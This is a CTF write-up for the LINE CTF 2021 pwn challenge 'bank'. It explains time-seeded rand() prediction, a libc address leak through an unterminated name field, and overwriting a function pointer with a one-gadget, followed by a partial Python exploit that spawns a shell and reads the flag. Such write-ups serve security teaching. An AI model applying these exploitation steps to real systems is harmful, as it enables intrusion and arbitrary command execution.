# LINE CTF 2021 - Pwn - bank

## Solution

When the VIP flag of User is set, the amount that can be written to memo increases, and the function pointer at the end of the structure can be overwritten.
In addition, a dedicated choice is displayed in the menu, and this function pointer can be called.
To set the VIP flag, we need to hold 200,000,000 currencies and make 0x14 remittances.

We can win lottery to earn currency.
The lottery winning number is generated using `rand()`, but before that the seed is initialized with `srand(time(NULL))`.
Therefore, if the time of the server is predicted correctly, the random numbers generated can also be predicted, and it will be possible to win with high probability.

Also, if we win the first prize, we will be asked to enter your name and address, but since it is not null-terminated, the value on the stack can be displayed. The base address of libc can be leaked from here.

After becoming a VIP, rewrite the function pointer to the next One Gadget.
```
0xe6e79 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```
By specifying an account with index 0 and 0 currency in VIP Transfer, the condition of One Gadget can be satisfied, so shell starts.

## Exploit Code

(The code below is an excerpt of only the important part of the exploit and cannot be executed by itself)

```python
def select(cmd):
    sc.after("Menu")
    for m in re.finditer(R"(\d)\.([^\d]+[a-zA-Z])", sc.recv_before("Input").decode()):
        if cmd == m[2]:
            sc.sendline(m[1])
            break
    else:
        raise ValueError(f"Invalid option: {cmd}")

def select_user(num):
    sc.after("Input :").sendline(str(num))

select("Add User")
sc.after("ID").sendline("0")
sc.after("Password").sendline("0")

select("Login")
sc.after("ID").sendline("0")
sc.after("Password").sendline("0")

select("Loan")
acc0_number = sc.recv_regex(R"Account number : (\d+)\s+")[1]
acc_number = sc.recv_regex(R"Account number : (\d+)\s+Amounts : -100")[1]

def win_lottery():
    import ctypes
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    def predict(t):
        libc.srand(t)
        nums = []
        while True:
            n = libc.rand() % 0x25 + 1
            if n in nums:
                continue
            nums.append(n)
            if len(nums) >= 7:
                break
        return nums
    
    t = libc.time(0)
    
    sc.after("Enter numbers:").sendline("\n".join(str(x) for x in predict(t)))
    sc.after("Name").sendline("AAAAAAAA")
    sc.after("Address").sendline("a")

select("Lottery")
win_lottery()

leak = bytearray(sc.after("Name : AAAAAAAA").recv(6))
leak[0] = 0x13

remote_libc_base = u2i(leak) - (0x7ffff7e69013 - 0x7ffff7dd5000)
print(f"{remote_libc_base=:#x}")

for i in range(0x14):
    select("Transfer")
    sc.after("transfer.").sendline(acc_number)
    sc.after("transfer.").sendline("10000")

select("User")
select_user("2")
sc.after("Input").sendline(b"*" * 56 + u64(remote_libc_base + 0xe6e79))
select_user("0")

select("VIP")
sc.after("transfer.").sendline(acc0_number)
sc.after("transfer.").sendline("0")

time.sleep(1)
sc.sendline("ls; cat flag*")
```